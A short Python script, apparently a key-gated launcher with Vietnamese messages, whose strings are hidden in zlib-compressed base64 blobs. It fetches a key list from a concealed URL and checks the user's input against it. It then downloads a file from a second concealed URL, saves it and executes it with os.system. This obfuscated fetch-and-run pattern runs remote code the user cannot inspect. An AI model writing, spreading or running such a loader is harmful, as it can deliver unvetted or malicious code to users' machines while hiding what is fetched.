E=exit
C=print
import zlib as A,base64 as B,os,requests as D
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJzjUlDQ8CitTM0LychPzPRIzAxJTFbwT0vLycxL1eTiUlDIKCkpKLbS10/PLMkoTdJLzs/V93MPjXT1CwnydA0N8Ah11s8A6S8B6c9IzCxJTEbWhi6nl5SZrwc0PFuBi4sLACEGKZQ='))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJwLTixVyM7IVEg+vCBT4cjEh7u2l+go5D7c3ZupUFha+XB3Y55CxsNdC/MUyg4vUCg5vDYvQyHvSHNeukLyw93LExVCUotySysUih/u2qtQklH6cPfMZIUyoC4FD6jmkIx8oPZMBY+HuxZnKoQAzU+GagIAIL87NQ=='))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJwLO7xWIeXh7qUKeRnHNigkPdy1ME8hO+Pwlrx0hZKMh7ubFRILShQy84pLEnNyQNJLSxSyD69RSD68MFMh/fAaHYVskKLkh7sWK6QUZKdzAQAnDyXX'))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJzze7hrf6lC0sNdC/MUcksf7p6Yp1BYmlipUPZwd6NCUmKewpGJD3ctL9VRyDi8uFIh+fCCTLDI9hKFHKCeTIWQ1KLc0gouLi4AU0ojCA=='))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJzzdo1U8AiNfLi7wU8hxMP/4a4FngoeD3ct8lQIebhrm7NCiGuQb2iEAhcXAGWfECg='))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJxTUFBQ0FXwe7hrf6lC0sNdC/MUkjOObUhUSD68WSE7tVKhpKi0UiH54a61BVZcXACmqxK4'))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJxTUACBjJKSgmIrff2M0srUvJKM/MTMjMTMksRkvaTMfL2czLxsLi4AD48NjA=='))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJwBNwDI/yAgICAtIELhuqFuIG114buRbiB0aeG6v3AgdOG7pWMgdnVpIGzDsm5nIG5o4bqtcCBrZXk/CgqcgBgK'))
I=(lambda s:A.decompress(B.b64decode(s)).decode())('eJzLKCkpKLbS108syNRNyi/Ry8/LycxLBXH1y4z1s1Mri/VKKkoADVMN5Q==')
try:J=D.get(I);H=J.text
except D.RequestException as F:C(f"Không thể tải key. Lỗi: {F}");E(1)
if not H:C((lambda s:A.decompress(B.b64decode(s)).decode())('eJzzzji8JS9doSTj4e5mhZKHuxZnKmSnVuopeGcCBXIVSooSFXIe7lqYqXBk4rEND3fPBapNebhrdZ5CRv7DXduTFbIf7tpfopD3cPfETIVcoMK8dD0AvToqCw=='));E(1)
K=input((lambda s:A.decompress(B.b64decode(s)).decode())('eJzzy3i4a22BQnZqpcKRiQ93NyuUZD7ctb9AoeTh7qXJVgoA/90PxQ=='))
if K not in H:C((lambda s:A.decompress(B.b64decode(s)).decode())('eJzj8k6tVMjOOLwlL13hyMTDu/LSdRTKSjMVcg5vAorkZB5elaeQ8XB3u0JiSm5mnkJuaaJCdmqlHgCYhxdO'));E(1)
L=(lambda s:A.decompress(B.b64decode(s)).decode())('eJzLKCkpKLbS108syNRNyi/Ry8/LycxLBXH1y4z1i0rz9AoqAfH2DQc=')
G=(lambda s:A.decompress(B.b64decode(s)).decode())('eJwrKs3TK6gEAAiWAm0=')
if not os.path.isfile(G):
	C((lambda s:A.decompress(B.b64decode(s)).decode())('eJw7MiExL12h5OGuxZkKaZk5qQp6enoAY2AIMA=='))
	try:
		M=D.get(L)
		with open(G,(lambda s:A.decompress(B.b64decode(s)).decode())('eJwrTwIAAVIA2g=='))as N:N.write(M.content)
		C((lambda s:A.decompress(B.b64decode(s)).decode())('eJwLebhrcaZCWmZOqkJJxuEFeRkKyYe35KUrAgCNOwrh'))
	except D.RequestException as F:C(f"Tải file thất bại! Lỗi: {F}");E(1)
else:C((lambda s:A.decompress(B.b64decode(s)).decode())('eJxzy8xJVTgy8fBihZKHuyfnAcldCzN1FLIzDm/JS1dIfrhrOVhscaZCDkhGDwBCPRf+'))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJzzTq1UODLx8K68dEWFIxMS89IVkjMe7lpYqZCWmZOqp6cHAO5+DaY='))
C((lambda s:A.decompress(B.b64decode(s)).decode())('eJw7MiExL13BO+Ph7vmZCkcmPNw9E8gNTi0qSy3SAwDKcw1F'))
os.system(f"python {G}")
